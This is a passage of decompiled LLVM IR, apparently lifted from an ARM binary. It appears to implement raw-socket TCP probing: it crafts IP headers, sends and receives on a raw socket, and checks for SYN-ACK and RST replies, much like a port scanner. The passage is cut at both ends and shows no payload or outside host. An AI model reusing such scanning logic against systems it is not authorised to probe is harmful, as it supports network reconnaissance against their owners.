  store i32 %v0_b820, i32* %r0.global-to-local, align 4
  %v5_b828 = inttoptr i32 %v0_b814 to i32*
  %v6_b828 = call i32 @function_a4e8(i32 %v0_b820, i32* %v5_b828, i32 12, i32 1)
  %v1_b830 = urem i32 %v6_b828, 256
  store i32 %v1_b830, i32* %ip.global-to-local, align 4
  %v0_b834 = load i32, i32* @r5, align 4
  store i32 %v0_b834, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b840 = load i32, i32* @r4, align 4
  store i32 %v0_b840, i32* %r0.global-to-local, align 4
  %v5_b848 = inttoptr i32 %v0_b834 to i32*
  %v6_b848 = call i32 @function_a4e8(i32 %v0_b840, i32* %v5_b848, i32 13, i32 1)
  %v1_b850 = urem i32 %v6_b848, 256
  store i32 %v1_b850, i32* %ip.global-to-local, align 4
  %v0_b854 = load i32, i32* @r5, align 4
  store i32 %v0_b854, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b860 = load i32, i32* @r4, align 4
  store i32 %v0_b860, i32* %r0.global-to-local, align 4
  %v5_b868 = inttoptr i32 %v0_b854 to i32*
  %v6_b868 = call i32 @function_a4e8(i32 %v0_b860, i32* %v5_b868, i32 14, i32 0)
  %v1_b870 = urem i32 %v6_b868, 256
  store i32 %v1_b870, i32* %ip.global-to-local, align 4
  %v0_b874 = load i32, i32* @r5, align 4
  store i32 %v0_b874, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b880 = load i32, i32* @r4, align 4
  store i32 %v0_b880, i32* %r0.global-to-local, align 4
  %v5_b888 = inttoptr i32 %v0_b874 to i32*
  %v6_b888 = call i32 @function_a4e8(i32 %v0_b880, i32* %v5_b888, i32 15, i32 0)
  %v1_b890 = urem i32 %v6_b888, 256
  store i32 %v1_b890, i32* %ip.global-to-local, align 4
  %v0_b894 = load i32, i32* @r5, align 4
  store i32 %v0_b894, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b8a0 = load i32, i32* @r4, align 4
  store i32 %v0_b8a0, i32* %r0.global-to-local, align 4
  %v5_b8a8 = inttoptr i32 %v0_b894 to i32*
  %v6_b8a8 = call i32 @function_a4e8(i32 %v0_b8a0, i32* %v5_b8a8, i32 16, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v6_b8a8, i32* %ip.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b8b8 = load i32, i32* @r5, align 4
  store i32 %v0_b8b8, i32* %r1.global-to-local, align 4
  %v0_b8bc = load i32, i32* @r4, align 4
  store i32 %v0_b8bc, i32* %r0.global-to-local, align 4
  %v1_b8c0 = urem i32 %v6_b8a8, 256
  store i32 %v1_b8c0, i32* @r8, align 4
  %v4_b8c4 = inttoptr i32 %v0_b8b8 to i32*
  %v5_b8c4 = call i32 @function_a4e8(i32 %v0_b8bc, i32* %v4_b8c4, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b8d0 = load i32, i32* @r5, align 4
  store i32 %v0_b8d0, i32* %r1.global-to-local, align 4
  store i32 %v5_b8c4, i32* @sb, align 4
  %v0_b8d8 = load i32, i32* @r4, align 4
  store i32 %v0_b8d8, i32* %r0.global-to-local, align 4
  %v4_b8dc = inttoptr i32 %v0_b8d0 to i32*
  %v5_b8dc = call i32 @function_a4e8(i32 %v0_b8d8, i32* %v4_b8dc, i32 1, i32 1)
  store i32 3, i32* %r1.global-to-local, align 4
  %v1_b8e8 = urem i32 %v5_b8dc, 256
  store i32 %v1_b8e8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b8f8 = call i32 @function_13f50(i32 2, i32 3, i32 6)
  store i32 %v3_b8f8, i32* %r0.global-to-local, align 4
  %v0_b8fc = load i32, i32* @r7, align 4
  %v3_b8fc = udiv i32 %v0_b8fc, 65536
  store i32 %v3_b8fc, i32* %r1.global-to-local, align 4
  %v7_b900 = icmp eq i32 %v3_b8f8, -1
  store i1 %v7_b900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b900, label %dec_label_pc_bb5c, label %dec_label_pc_b910

dec_label_pc_b910:                                ; preds = %dec_label_pc_b728
  store i32 1, i32* %stack_var_-40, align 4
  %v6_b918 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_b918, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_b92c = call i32 @function_13f20(i32 %v3_b8f8, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_b92c, i32* %r0.global-to-local, align 4
  %v7_b930 = icmp eq i32 %v6_b92c, -1
  store i1 %v7_b930, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b930, label %dec_label_pc_bb54, label %dec_label_pc_b938

dec_label_pc_b938:                                ; preds = %dec_label_pc_b910
  %v0_b938 = load i32, i32* @fp, align 4
  %v2_b938 = icmp eq i32 %v0_b938, 0
  store i1 %v2_b938, i1* %cpsr_z.global-to-local, align 1
  %v0_b93c = load i32, i32* @r6, align 4
  %v3_b93c = mul i32 %v0_b93c, 65536
  store i32 %v3_b93c, i32* %r0.global-to-local, align 4
  %v3_b940 = urem i32 %v0_b93c, 65536
  store i32 %v3_b940, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp72 = icmp slt i32 %v0_b938, 1
  br i1 %tmp72, label %.thread18, label %dec_label_pc_b964.preheader

.thread18:                                        ; preds = %dec_label_pc_b938
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_bde8

dec_label_pc_b964.preheader:                      ; preds = %dec_label_pc_b938
  %v5_b948 = load i32, i32* @r7, align 4
  %v8_b948 = udiv i32 %v5_b948, 16777216
  %tmp73 = udiv i32 %v0_b93c, 256
  %v8_b94c = urem i32 %tmp73, 256
  store i32 %v8_b94c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v3_ba50 = icmp ugt i32 %v0_b8fc, -65537
  %v2_ba74 = ptrtoint i32* %stack_var_-60 to i32
  %v3_ba80 = bitcast i32* %stack_var_-60 to %sockaddr*
  %v2_bab0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_bab4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_bab8 = ptrtoint i32* %stack_var_-332 to i32
  %v4_bb04 = zext i8 %tmp31 to i32
  %v4_bb08 = zext i8 %tmp30 to i32
  %v4_bb14 = mul nuw nsw i32 %v4_bb08, 256
  %v4_bb24 = zext i8 %tmp to i32
  %v1_bb28 = and i32 %v4_bb24, 18
  %v2_bb2c = icmp eq i32 %v1_bb28, 18
  %v1_ba60 = mul nuw nsw i32 %v3_b8fc, 256
  %v4_ba64 = and i32 %v1_ba60, 65280
  %v5_ba64 = or i32 %v8_b948, %v4_ba64
  %v3_ba6893 = udiv i32 %v4_ba64, 256
  %v1_ba6c = trunc i32 %v3_ba6893 to i8
  %v1_bc30 = mul i32 %v0_b93c, 256
  %v4_bc38 = and i32 %v1_bc30, 65280
  %sext = mul i32 %v6_b770, 16777216
  %v4_bc48 = sdiv i32 %sext, 16777216
  %sext5 = mul i32 %v5_b7ac, 16777216
  %v4_bc6c = sdiv i32 %sext5, 16777216
  %v5_bb14 = or i32 %v4_bb04, %v4_bb14
  %v1_bb34 = and i32 %v4_bb24, 5
  %v2_bb34 = icmp eq i32 %v1_bb34, 0
  %v1_ba70 = trunc i32 %v8_b948 to i8
  %v5_bc38 = or i32 %v8_b94c, %v4_bc38
  %v1_bc58 = trunc i32 %v4_bc48 to i8
  %v1_bd38 = urem i32 %v5_b808, 2
  %tmp94 = sub nsw i32 0, %v1_bd38
  %v4_bd40 = and i32 %tmp94, 32
  %v1_bd50 = urem i32 %v6_b828, 2
  %tmp95 = sub nsw i32 0, %v1_bd50
  %v4_bd58 = and i32 %tmp95, 16
  %v1_bd68 = urem i32 %v6_b848, 2
  %tmp96 = sub nsw i32 0, %v1_bd68
  %v4_bd70 = and i32 %tmp96, 8
  %v1_bd80 = urem i32 %v6_b868, 2
  %tmp97 = sub nsw i32 0, %v1_bd80
  %v4_bd88 = and i32 %tmp97, 4
  %v1_bd98 = urem i32 %v6_b888, 2
  %tmp98 = sub nsw i32 0, %v1_bd98
  %v3_bda0 = and i32 %tmp98, 2
  br label %dec_label_pc_b964

dec_label_pc_b964:                                ; preds = %dec_label_pc_bdd4, %dec_label_pc_bb3c, %dec_label_pc_b964.preheader
  store i32 %v8_b94c, i32* %r3.global-to-local, align 4
  %v0_b970 = load i32, i32* @sb, align 4
  %v1_b970 = add i32 %v0_b970, 40
  store i32 %v1_b970, i32* @sl, align 4
  br label %dec_label_pc_b974

dec_label_pc_b974:                                ; preds = %dec_label_pc_bb48, %dec_label_pc_b964
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b980 = call i32 @function_13f50(i32 2, i32 1, i32 0)
  store i32 %v3_b980, i32* %r0.global-to-local, align 4
  %v7_b984 = icmp eq i32 %v3_b980, -1
  store i1 %v7_b984, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b980, i32* @r7, align 4
  br i1 %v7_b984, label %dec_label_pc_bdd4, label %dec_label_pc_b990

dec_label_pc_b990:                                ; preds = %dec_label_pc_b974
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b998 = call i32 @function_13564(i32 %v3_b980, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b9a0 = or i32 %v2_b998, 2048
  store i32 %v1_b9a0, i32* @r2, align 4
  %v0_b9a4 = load i32, i32* @r7, align 4
  store i32 %v0_b9a4, i32* %r0.global-to-local, align 4
  %v2_b9a8 = call i32 @function_13564(i32 %v0_b9a4, i32 4)
  store i32 %v2_b9a8, i32* %r0.global-to-local, align 4
  %v3_b9ac = load i32, i32* %stack_var_-40, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_b9bc = mul i32 %v3_b9ac, 24
  store i32 %v5_b9bc, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v2_b9cc = add i32 %v5_b9bc, %arg2
  store i32 %v2_b9cc, i32* %r2.global-to-local, align 4
  %v1_b9d0 = add i32 %v2_b9cc, 20
  %v2_b9d0 = inttoptr i32 %v1_b9d0 to i8*
  %v3_b9d0 = load i8, i8* %v2_b9d0, align 1
  %v4_b9d0 = zext i8 %v3_b9d0 to i32
  store i32 %v4_b9d0, i32* %r3.global-to-local, align 4
  %v2_b9d4 = icmp ugt i8 %v3_b9d0, 30
  %v7_b9d4 = icmp eq i8 %v3_b9d0, 31
  store i1 %v7_b9d4, i1* %cpsr_z.global-to-local, align 1
  %v2_b9d8 = xor i1 %v7_b9d4, true
  %v3_b9d8 = and i1 %v2_b9d4, %v2_b9d8
  %v5_b9d8 = add i32 %v2_b9cc, 16
  %v6_b9d8 = inttoptr i32 %v5_b9d8 to i32*
  %v7_b9d8 = load i32, i32* %v6_b9d8, align 4
  br i1 %v3_b9d8, label %dec_label_pc_ba44, label %dec_label_pc_b9e4

dec_label_pc_b9e4:                                ; preds = %dec_label_pc_b990
  store i32 %v7_b9d8, i32* @r4, align 4
  %v0_b9e8 = call i32 @function_fe60()
  store i32 %v0_b9e8, i32* %r0.global-to-local, align 4
  %v3_b9ec = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v5_b9f8 = mul i32 %v3_b9ec, 24
  %v0_b9fc = load i32, i32* @r4, align 4
  %v2_ba00 = add i32 %v5_b9f8, %arg2
  store i32 %v2_ba00, i32* %r1.global-to-local, align 4
  %v1_ba04 = and i32 %v0_b9fc, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_ba04, i32* %r3.global-to-local, align 4
  %v1_b9fc = udiv i32 %v0_b9fc, 256
  %v3_ba08 = and i32 %v1_b9fc, 65280
  store i32 %v3_ba08, i32* %r2.global-to-local, align 4
  %v3_ba0c = mul i32 %v0_b9fc, 16777216
  store i32 %v3_ba0c, i32* %ip.global-to-local, align 4
  %v1_ba10 = add i32 %v2_ba00, 20
  %v2_ba10 = inttoptr i32 %v1_ba10 to i8*
  %v3_ba10 = load i8, i8* %v2_ba10, align 1
  %v4_ba10 = zext i8 %v3_ba10 to i32
  store i32 %v4_ba10, i32* %lr.global-to-local, align 4
  %v4_ba14 = mul i32 %v1_ba04, 256
  %v5_ba14 = or i32 %v4_ba14, %v3_ba0c
  store i32 %v5_ba14, i32* %ip.global-to-local, align 4
  %v4_ba18 = udiv i32 %v0_b9fc, 16777216
  %v5_ba18 = or i32 %v3_ba08, %v4_ba18
  %v2_ba1c = or i32 %v5_ba18, %v5_ba14
  %v7_ba20 = lshr i32 %v0_b9e8, %v4_ba10
  %v8_ba20 = add i32 %v7_ba20, %v2_ba1c
  store i32 %v8_ba20, i32* %r2.global-to-local, align 4
  %v3_ba2c = mul i32 %v8_ba20, 16777216
  %v1_ba30 = and i32 %v8_ba20, 65280
  store i32 %v1_ba30, i32* %r0.global-to-local, align 4
  %v4_ba34 = mul nuw nsw i32 %v1_ba30, 256
  %v5_ba34 = or i32 %v4_ba34, %v3_ba2c
  store i32 %v5_ba34, i32* %r1.global-to-local, align 4
  %v2_ba3c = call i32 @llvm.bswap.i32(i32 %v8_ba20)
  br label %dec_label_pc_ba44

dec_label_pc_ba44:                                ; preds = %dec_label_pc_b990, %dec_label_pc_b9e4
  %storemerge25 = phi i32 [ %v2_ba3c, %dec_label_pc_b9e4 ], [ %v7_b9d8, %dec_label_pc_b990 ]
  store i32 %v3_b8fc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_ba50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ba50, label %dec_label_pc_bb64, label %dec_label_pc_ba58

dec_label_pc_ba58:                                ; preds = %dec_label_pc_ba44
  store i32 %v8_b948, i32* %ip.global-to-local, align 4
  store i32 %v5_ba64, i32* %r3.global-to-local, align 4
  store i32 %v3_ba6893, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ba74

dec_label_pc_ba74:                                ; preds = %dec_label_pc_bb64, %dec_label_pc_ba58
  %stack_var_-57.0 = phi i8 [ %v1_bb6c, %dec_label_pc_bb64 ], [ %v1_ba6c, %dec_label_pc_ba58 ]
  %storemerge = phi i8 [ %v1_bb64, %dec_label_pc_bb64 ], [ %v1_ba70, %dec_label_pc_ba58 ]
  store i32 %v2_ba74, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_ba7c = load i32, i32* @r7, align 4
  store i32 %v0_ba7c, i32* %r0.global-to-local, align 4
  %v4_ba80 = call i32 @function_13dac(i32 %v0_ba7c, %sockaddr* nonnull %v3_ba80, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ba88 = call i32 @function_13924(i32* null)
  store i32 %v2_ba88, i32* %r0.global-to-local, align 4
  store i32 %v2_ba88, i32* @r4, align 4
  %v9_bae8 = icmp eq i32 %tmp32, %storemerge25
  %v4_bb0c = zext i8 %storemerge to i32
  %v4_bb10 = zext i8 %stack_var_-57.0 to i32
  %. = zext i1 %v9_bae8 to i32
  %v9_bafc = icmp eq i1 %v9_bae8, false
  %v4_bb18 = mul nuw nsw i32 %v4_bb10, 256
  %v5_bb18 = or i32 %v4_bb18, %v4_bb0c
  %v9_bb1c = icmp eq i32 %v5_bb18, %v5_bb14
  br label %dec_label_pc_baa4

dec_label_pc_ba94:                                ; preds = %.thread23, %dec_label_pc_bb04, %dec_label_pc_bb34, %bb75
  %v2_ba94 = call i32 @function_13924(i32* null)
  %v0_ba98 = load i32, i32* @r4, align 4
  %v2_ba98 = sub i32 %v2_ba94, %v0_ba98
  store i32 %v2_ba98, i32* %r0.global-to-local, align 4
  %v7_ba9c = icmp eq i32 %v2_ba98, 10
  store i1 %v7_ba9c, i1* %cpsr_z.global-to-local, align 1
  %v8_baa0 = icmp sgt i32 %v2_ba98, 10
  br i1 %v8_baa0, label %dec_label_pc_bb48, label %dec_label_pc_baa4

dec_label_pc_baa4:                                ; preds = %dec_label_pc_ba94, %dec_label_pc_ba74
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-44, align 4
  store i32 %v2_bab0, i32* %lr.global-to-local, align 4
  store i32 %v2_bab4, i32* %ip.global-to-local, align 4
  store i32 %v2_bab8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_b8f8, i32* %r0.global-to-local, align 4
  %v7_bacc = call i32 @function_13e8c(i32 %v3_b8f8, i32* nonnull %stack_var_-332, i32 256, i32 16384, i32 %v2_bab0, i32 %v2_bab4)
  store i32 %v7_bacc, i32* %r2.global-to-local, align 4
  %v7_bad4 = icmp eq i32 %v7_bacc, -1
  store i1 %v7_bad4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_bad4, label %dec_label_pc_bb5c, label %dec_label_pc_bae0

dec_label_pc_bae0:                                ; preds = %dec_label_pc_baa4
  store i32 %tmp32, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_baf4 = icmp eq i32 %v7_bacc, 40
  store i1 %v7_baf4, i1* %cpsr_z.global-to-local, align 1
  %tmp99 = icmp ult i32 %v7_bacc, 41
  br i1 %tmp99, label %.thread23, label %bb75

.thread23:                                        ; preds = %dec_label_pc_bae0
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ba94

bb75:                                             ; preds = %dec_label_pc_bae0
  store i1 %v9_bafc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bafc, label %dec_label_pc_ba94, label %dec_label_pc_bb04

dec_label_pc_bb04:                                ; preds = %bb75
  store i32 %v4_bb08, i32* %r1.global-to-local, align 4
  store i32 %v4_bb0c, i32* %ip.global-to-local, align 4
  store i32 %v4_bb10, i32* %r2.global-to-local, align 4
  store i32 %v5_bb14, i32* %r3.global-to-local, align 4
  store i32 %v5_bb18, i32* @r5, align 4
  store i1 %v9_bb1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bb1c, label %dec_label_pc_bb24, label %dec_label_pc_ba94

dec_label_pc_bb24:                                ; preds = %dec_label_pc_bb04
  store i32 %v4_bb24, i32* %r2.global-to-local, align 4
  store i32 %v1_bb28, i32* %r3.global-to-local, align 4
  store i1 %v2_bb2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bb2c, label %dec_label_pc_bb78, label %dec_label_pc_bb34

dec_label_pc_bb34:                                ; preds = %dec_label_pc_bb24
  store i1 %v2_bb34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bb34, label %dec_label_pc_ba94, label %dec_label_pc_bb3c

dec_label_pc_bb3c:                                ; preds = %dec_label_pc_bb34
  %v0_bb3c = load i32, i32* @r7, align 4
  store i32 %v0_bb3c, i32* %r0.global-to-local, align 4
  %v1_bb40 = call i32 @function_13654(i32 %v0_bb3c)
  store i32 %v1_bb40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b964

dec_label_pc_bb48:                                ; preds = %dec_label_pc_ba94
  %v0_bb48 = load i32, i32* @r7, align 4
  store i32 %v0_bb48, i32* %r0.global-to-local, align 4
  %v1_bb4c = call i32 @function_13654(i32 %v0_bb48)
  store i32 %v1_bb4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b974

dec_label_pc_bb54:                                ; preds = %dec_label_pc_b910
  store i32 %v3_b8f8, i32* %r0.global-to-local, align 4
  %v1_bb58 = call i32 @function_13654(i32 %v3_b8f8)
  store i32 %v1_bb58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb5c

dec_label_pc_bb5c:                                ; preds = %dec_label_pc_baa4, %dec_label_pc_b728, %dec_label_pc_bb54
  %v29_bb60 = phi i32 [ %v3_b8f8, %dec_label_pc_b728 ], [ %v1_bb58, %dec_label_pc_bb54 ], [ 0, %dec_label_pc_baa4 ]
  ret i32 %v29_bb60

dec_label_pc_bb64:                                ; preds = %dec_label_pc_ba44
  %v0_bb64 = call i32 @function_fe60()
  %v1_bb64 = trunc i32 %v0_bb64 to i8
  store i32 %v0_bb64, i32* %r0.global-to-local, align 4
  %v4_bb68 = sdiv i32 %v0_bb64, 256
  store i32 %v4_bb68, i32* %r3.global-to-local, align 4
  %v1_bb6c = trunc i32 %v4_bb68 to i8
  br label %dec_label_pc_ba74

dec_label_pc_bb78:                                ; preds = %dec_label_pc_bb24
  %v3_bb78 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bb78, i32* @r4, align 4
  store i32 %v2_b748, i32* %r2.global-to-local, align 4
  %v3_bb80 = mul i32 %v3_bb78, 16
  store i32 %v3_bb80, i32* %ip.global-to-local, align 4
  %v3_bb84 = add i32 %v3_bb80, %v2_b748
  %v4_bb84 = inttoptr i32 %v3_bb84 to i32*
  store i32 %storemerge25, i32* %v4_bb84, align 4
  %v0_bb88 = load i32, i32* @r6, align 4
  %v1_bb88 = add i32 %v0_bb88, 4
  %v2_bb88 = inttoptr i32 %v1_bb88 to i32*
  %v3_bb88 = load i32, i32* %v2_bb88, align 4
  store i32 %v3_bb88, i32* %r0.global-to-local, align 4
  %v1_bb90 = and i32 %v3_bb88, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_bb90, i32* %r1.global-to-local, align 4
  store i32 %v2_b748, i32* %lr.global-to-local, align 4
  %v3_bb98 = mul i32 %v3_bb88, 16777216
  %v1_bb8c = udiv i32 %v3_bb88, 256
  %v3_bb9c = and i32 %v1_bb8c, 65280
  %v4_bba0 = mul i32 %v1_bb90, 256
  %v5_bba0 = or i32 %v4_bba0, %v3_bb98
  store i32 %v5_bba0, i32* %r2.global-to-local, align 4
  %v4_bba4 = udiv i32 %v3_bb88, 16777216
  %v5_bba4 = or i32 %v3_bb9c, %v4_bba4
  %v1_bba8 = load i32, i32* %ip.global-to-local, align 4
  %v2_bba8 = add i32 %v1_bba8, %v2_b748
  store i32 %v2_bba8, i32* %ip.global-to-local, align 4
  %v2_bbac = or i32 %v5_bba4, %v5_bba0
  store i32 %v2_bbac, i32* %r3.global-to-local, align 4
  %v2_bbb0 = add i32 %v2_bba8, 4
  %v3_bbb0 = inttoptr i32 %v2_bbb0 to i32*
  store i32 %v2_bbac, i32* %v3_bbb0, align 4
  %v0_bbb4 = load i32, i32* @r6, align 4
  %v1_bbb4 = add i32 %v0_bbb4, 8
  %v2_bbb4 = inttoptr i32 %v1_bbb4 to i32*
  %v3_bbb4 = load i32, i32* %v2_bbb4, align 4
  store i32 %v3_bbb4, i32* %r0.global-to-local, align 4
  %v1_bbbc = and i32 %v3_bbb4, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_bbbc, i32* %r1.global-to-local, align 4
  %v3_bbc0 = mul i32 %v3_bbb4, 16777216
  %v1_bbb8 = udiv i32 %v3_bbb4, 256
  %v3_bbc4 = and i32 %v1_bbb8, 65280
  %v4_bbc8 = mul i32 %v1_bbbc, 256
  %v5_bbc8 = or i32 %v4_bbc8, %v3_bbc0
  store i32 %v5_bbc8, i32* %r2.global-to-local, align 4
  %v4_bbcc = udiv i32 %v3_bbb4, 16777216
  %v5_bbcc = or i32 %v3_bbc4, %v4_bbcc
  %v2_bbd0 = or i32 %v5_bbcc, %v5_bbc8
  store i32 %v2_bbd0, i32* %r3.global-to-local, align 4
  %v1_bbd4 = load i32, i32* %ip.global-to-local, align 4
  %v2_bbd4 = add i32 %v1_bbd4, 8
  %v3_bbd4 = inttoptr i32 %v2_bbd4 to i32*
  store i32 %v2_bbd0, i32* %v3_bbd4, align 4
  %v0_bbd8 = load i32, i32* @r6, align 4
  %v1_bbd8 = inttoptr i32 %v0_bbd8 to i32*
  %v2_bbd8 = load i32, i32* %v1_bbd8, align 4
  %v3_bbdc = udiv i32 %v2_bbd8, 65536
  store i32 %v3_bbdc, i32* %r2.global-to-local, align 4
  %v3_bbe03 = udiv i32 %v2_bbd8, 16777216
  store i32 %v3_bbe03, i32* %r1.global-to-local, align 4
  %v0_bbe4 = load i32, i32* @r5, align 4
  %v3_bbe4 = sdiv i32 %v0_bbe4, 256
  store i32 %v3_bbe4, i32* %r3.global-to-local, align 4
  %v1_bbe8 = trunc i32 %v3_bbe4 to i8
  %v2_bbe8 = load i32, i32* %ip.global-to-local, align 4
  %v3_bbe8 = add i32 %v2_bbe8, 15
  %v4_bbe8 = inttoptr i32 %v3_bbe8 to i8*
  store i8 %v1_bbe8, i8* %v4_bbe8, align 1
  %v0_bbec = load i32, i32* %r1.global-to-local, align 4
  %v1_bbec = trunc i32 %v0_bbec to i8
  %v2_bbec = load i32, i32* %ip.global-to-local, align 4
  %v3_bbec = add i32 %v2_bbec, 13
  %v4_bbec = inttoptr i32 %v3_bbec to i8*
  store i8 %v1_bbec, i8* %v4_bbec, align 1
  %v0_bbf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bbf0 = trunc i32 %v0_bbf0 to i8
  %v2_bbf0 = load i32, i32* %ip.global-to-local, align 4
  %v3_bbf0 = add i32 %v2_bbf0, 12
  %v4_bbf0 = inttoptr i32 %v3_bbf0 to i8*
  store i8 %v1_bbf0, i8* %v4_bbf0, align 1
  %v0_bbf4 = load i32, i32* @r5, align 4
  %v1_bbf4 = trunc i32 %v0_bbf4 to i8
  %v2_bbf4 = load i32, i32* %ip.global-to-local, align 4
  %v3_bbf4 = add i32 %v2_bbf4, 14
  %v4_bbf4 = inttoptr i32 %v3_bbf4 to i8*
  store i8 %v1_bbf4, i8* %v4_bbf4, align 1
  %v0_bbf8 = load i32, i32* @sl, align 4
  store i32 %v0_bbf8, i32* %r0.global-to-local, align 4
  %v1_bbfc = call i32 @function_14100(i32 %v0_bbf8)
  store i32 %v1_bbfc, i32* %r0.global-to-local, align 4
  store i32 %v2_b758, i32* %r1.global-to-local, align 4
  %v3_bc04 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bc04, i32* %r2.global-to-local, align 4
  %v2_bc08 = load i32, i32* @r4, align 4
  %v5_bc08 = mul i32 %v2_bc08, 4
  %v6_bc08 = add i32 %v5_bc08, %v2_b758
  %v7_bc08 = inttoptr i32 %v6_bc08 to i32*
  store i32 %v1_bbfc, i32* %v7_bc08, align 4
  %v0_bc0c = load i32, i32* %r1.global-to-local, align 4
  %v1_bc0c = load i32, i32* %r2.global-to-local, align 4
  %v4_bc0c = mul i32 %v1_bc0c, 4
  %v5_bc0c = add i32 %v4_bc0c, %v0_bc0c
  %v6_bc0c = inttoptr i32 %v5_bc0c to i32*
  %v7_bc0c = load i32, i32* %v6_bc0c, align 4
  store i32 %v7_bc0c, i32* @r4, align 4
  %v1_bc10 = inttoptr i32 %v7_bc0c to i8*
  %v2_bc10 = load i8, i8* %v1_bc10, align 1
  %tmp100 = urem i8 %v2_bc10, 16
  %v1_bc14 = zext i8 %tmp100 to i32
  %v1_bc18 = or i32 %v1_bc14, 64
  store i32 %v1_bc18, i32* %r3.global-to-local, align 4
  %v1_bc1c = trunc i32 %v1_bc18 to i8
  store i8 %v1_bc1c, i8* %v1_bc10, align 1
  %v0_bc20 = load i32, i32* @r4, align 4
  %v1_bc20 = inttoptr i32 %v0_bc20 to i8*
  %v2_bc20 = load i8, i8* %v1_bc20, align 1
  store i32 %v3_b940, i32* %ip.global-to-local, align 4
  %v1_bc2c = and i8 %v2_bc20, -16
  %v1_bc34 = or i8 %v1_bc2c, 5
  store i32 %v5_bc38, i32* %r0.global-to-local, align 4
  %v0_bc3c = load i32, i32* @sl, align 4
  %v3_bc3c = mul i32 %v0_bc3c, 65536
  store i32 %v3_bc3c, i32* %r2.global-to-local, align 4
  store i32 %v1_b7d8, i32* %lr.global-to-local, align 4
  store i8 %v1_bc34, i8* %v1_bc20, align 1
  store i32 %v4_bc48, i32* %r1.global-to-local, align 4
  %v0_bc4c = load i32, i32* %r2.global-to-local, align 4
  %v3_bc4c = udiv i32 %v0_bc4c, 65536
  %v1_bc50 = urem i32 %v3_bc4c, 256
  store i32 %v1_bc50, i32* %r3.global-to-local, align 4
  %v3_bc54 = udiv i32 %v0_bc4c, 16777216
  store i32 %v3_bc54, i32* %r2.global-to-local, align 4
  %v2_bc58 = load i32, i32* @r4, align 4
  %v3_bc58 = add i32 %v2_bc58, 1
  %v4_bc58 = inttoptr i32 %v3_bc58 to i8*
  store i8 %v1_bc58, i8* %v4_bc58, align 1
  %v0_bc5c = load i32, i32* %r2.global-to-local, align 4
  %v1_bc5c = load i32, i32* %r3.global-to-local, align 4
  %v4_bc5c = mul i32 %v1_bc5c, 256
  %v5_bc5c = or i32 %v4_bc5c, %v0_bc5c
  store i32 %v5_bc5c, i32* %r2.global-to-local, align 4
  %v1_bc60 = trunc i32 %v0_bc5c to i8
  %v2_bc60 = load i32, i32* @r4, align 4
  %v3_bc60 = add i32 %v2_bc60, 2
  %v4_bc60 = inttoptr i32 %v3_bc60 to i8*
  store i8 %v1_bc60, i8* %v4_bc60, align 1
